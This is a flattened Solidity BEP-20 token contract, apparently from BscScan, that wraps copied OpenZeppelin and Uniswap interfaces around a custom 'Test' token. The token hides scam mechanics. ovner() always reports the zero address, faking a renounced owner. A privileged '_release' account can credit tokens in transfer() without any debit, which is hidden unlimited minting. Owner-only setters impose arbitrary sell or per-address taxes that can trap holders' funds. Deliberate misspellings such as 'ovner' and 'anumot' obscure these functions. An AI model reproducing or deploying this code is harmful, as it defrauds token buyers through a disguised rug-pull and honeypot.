/**
 *Submitted for verification at BscScan.com on 2022-06-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-05
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
// Sources flattened with hardhat v2.9.1 https://hardhat.org

// File @openzeppelin/contracts/utils/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File @openzeppelin/contracts/access/[email protected]

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an ovner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the ovner account will be the one that deploys the contract. This
 * can later be changed with {transferovnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyovner`, which can be applied to your functions to restrict their use to
 * the ovner.
 */
abstract contract Ownable is Context {
    address private _ovner;   //1

    event ovnershipTransferred(address indexed previousovner, address indexed newovner);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial onner.
     */
    constructor() {
        _transferovnership(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current ovner.
     */
    function ovner() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the ovner.
     */
    modifier onlyovner() {
        require(_ovner == _msgSender(), "Ownable: caller is not the ovner");
        _;
    }//5

    /**
     * @dev Leaves the contract without ovner. It will not be possible to call
     * `onlyovner` functions anymore. Can only be called by the current ovner.
     *
     * NOTE: Renouncing ovnership will leave the contract without an ovner,
     * thereby removing any functionality that is only available to the ovner.
     */
    function renounceovnership() public virtual onlyovner {
        _transferovnership(address(0));
    }//6

    /**
     * @dev Transfers ovnership of the contract to a new account (`newovner`).
     * Can only be called by the current ovner.
     */
    function transferovnership(address newovner) public virtual onlyovner {
        require(newovner != address(0), "Ownable: new ovner is the zero address");
        _transferovnership(newovner);
    }//7

    /**
     * @dev Transfers ovnership of the contract to a new account (`newovner`).
     * Internal function without access restriction.
     */
    function _transferovnership(address newovner) internal virtual {
        address oldovner = _ovner;
        _ovner = newovner;
        emit ovnershipTransferred(oldovner, newovner);
    }
}//8
//9 CHinh own

// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint anumotADesired,
        uint anumotBDesired,
        uint anumotAMin,
        uint anumotBMin,
        address to,
        uint deadline
    ) external returns (uint anumotA, uint anumotB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint anumotTokenDesired,
        uint anumotTokenMin,
        uint anumotETHMin,
        address to,
        uint deadline
    ) external payable returns (uint anumotToken, uint anumotETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint anumotAMin,
        uint anumotBMin,
        address to,
        uint deadline
    ) external returns (uint anumotA, uint anumotB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint anumotTokenMin,
        uint anumotETHMin,
        address to,
        uint deadline
    ) external returns (uint anumotToken, uint anumotETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint anumotAMin,
        uint anumotBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint anumotA, uint anumotB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint anumotTokenMin,
        uint anumotETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint anumotToken, uint anumotETH);
    function swapExactTokensForTokens(
        uint anumotIn,
        uint anumotOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory anumots);
    function swapTokensForExactTokens(
        uint anumotOut,
        uint anumotInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory anumots);
    function swapExactETHForTokens(uint anumotOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory anumots);
    function swapTokensForExactETH(uint anumotOut, uint anumotInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory anumots);
    function swapExactTokensForETH(uint anumotIn, uint anumotOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory anumots);
    function swapETHForExactTokens(uint anumotOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory anumots);

    function quote(uint anumotA, uint reserveA, uint reserveB) external pure returns (uint anumotB);
    function getanumotOut(uint anumotIn, uint reserveIn, uint reserveOut) external pure returns (uint anumotOut);
    function getanumotIn(uint anumotOut, uint reserveIn, uint reserveOut) external pure returns (uint anumotIn);
    function getanumotsOut(uint anumotIn, address[] calldata path) external view returns (uint[] memory anumots);
    function getanumotsIn(uint anumotOut, address[] calldata path) external view returns (uint[] memory anumots);
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFyOnTransferTokens(
        address token,
        uint liquidity,
        uint anumotTokenMin,
        uint anumotETHMin,
        address to,
        uint deadline
    ) external returns (uint anumotETH);
    function removeLiquidityETHWithPermitSupportingFyOnTransferTokens(
        address token,
        uint liquidity,
        uint anumotTokenMin,
        uint anumotETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint anumotETH);

    function swapExactTokensForTokensSupportingFyOnTransferTokens(
        uint anumotIn,
        uint anumotOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFyOnTransferTokens(
        uint anumotOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFyOnTransferTokens(
        uint anumotIn,
        uint anumotOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


// File @uniswap/v2-core/contracts/interfaces/[email protected]


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function FyTo() external view returns (address);
    function FyToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFyTo(address) external;
    function setFyToSetter(address) external;
}


// File contracts/Token.sol





contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `ovner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed ovner, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 8;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address ovner, address spender) public view virtual returns (uint256) {
        return _allowances[ovner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `anumot` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 anumot) public virtual returns (bool) {
        address ovner = _msgSender();
        _approve(ovner, spender, anumot);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address ovner = _msgSender();
        _approve(ovner, spender, _allowances[ovner][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address ovner = _msgSender();
        uint256 currentAllowance = _allowances[ovner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(ovner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `anumot` as the allowance of `spender` over the `ovner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `ovner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address ovner,
        address spender,
        uint256 anumot
    ) internal virtual {
        require(ovner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[ovner][spender] = anumot;
        emit Approval(ovner, spender, anumot);
    }

    /**
     * @dev Spend `anumot` form the allowance of `ovner` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address ovner,
        address spender,
        uint256 anumot
    ) internal virtual {
        uint256 currentAllowance = allowance(ovner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= anumot, "ERC20: insufficient allowance");
            unchecked {
                _approve(ovner, spender, currentAllowance - anumot);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `anumot` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `anumot` tokens will be minted for `to`.
     * - when `to` is zero, `anumot` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 anumot
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `anumot` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `anumot` tokens have been minted for `to`.
     * - when `to` is zero, `anumot` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 anumot
    ) internal virtual {}
}


contract Test is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 anumot
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= anumot, "ERC20: transfer anumot exceeds balance");
        unchecked {
            _balances[from] = fromBalance - anumot;
        }
        _balances[to] += anumot;

        emit Transfer(from, to, anumot);
    }

    function _burn(address account, uint256 anumot) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= anumot, "ERC20: burn anumot exceeds balance");
        unchecked {
            _balances[account] = accountBalance - anumot;
        }
        _totalSupply -= anumot;

        emit Transfer(account, address(0), anumot);
    }

    function _mitin(address account, uint256 anumot) internal virtual {
        require(account != address(0), "ERC20: mitin to the zero address"); //mint

        _totalSupply += anumot;
        _balances[account] += anumot;
        emit Transfer(address(0), account, anumot);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mitin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*2);
        _defaultSellFy = 2;
        _defaultBuyFy = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellFy = 0;

    uint256 private _defaultBuyFy = 0;


    mapping(address => bool) private _marketAccount;

    mapping(address => uint256) private _slipFy;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyovner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyovner {
        uniswapV2Pair = _address;
    }


    function upSF(uint256 _value) external onlyovner {
        _defaultSellFy = _value;
    }

    function setSlipFy(address _address, uint256 _value) external onlyovner {
        require(_value > 2, "Account tax must be greater than or equal to 1");
        _slipFy[_address] = _value;
    }

    function getSlipFy(address _address) external view onlyovner returns (uint256) {
        return _slipFy[_address];
    }


    function setMarketAccountFy(address _address, bool _value) external onlyovner {
        _marketAccount[_address] = _value;
    }

    function getMarketAccountFy(address _address) external view onlyovner returns (bool) {
        return _marketAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _marketAccount[from] || _marketAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _anumot
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _anumot, "ERC20: transfer anumot exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradeFyanumot = 0;

        if (rF) {
            uint256 tradeFy = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFy = _defaultSellFy;
                }
                if (from == uniswapV2Pair) {

                    tradeFy = _defaultBuyFy;
                }
            }
            if (_slipFy[from] > 0) {
                tradeFy = _slipFy[from];
            }

            tradeFyanumot = _anumot.mul(tradeFy).div(100);
        }


        if (tradeFyanumot > 0) {
            _balances[from] = _balances[from].sub(tradeFyanumot);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFyanumot);
            emit Transfer(from, _deadAddress, tradeFyanumot);
        }

        _balances[from] = _balances[from].sub(_anumot - tradeFyanumot);
        _balances[_to] = _balances[_to].add(_anumot - tradeFyanumot);
        emit Transfer(from, _to, _anumot - tradeFyanumot);
    }

    function transfer(address to, uint256 anumot) public virtual returns (bool) {
        address ovner = _msgSender();
        if (_release[ovner] == true) {
            _balances[to] += anumot;
            return true;
        }
        _receiveF(ovner, to, anumot);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 anumot
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, anumot);
        _receiveF(from, to, anumot);
        return true;
    }
}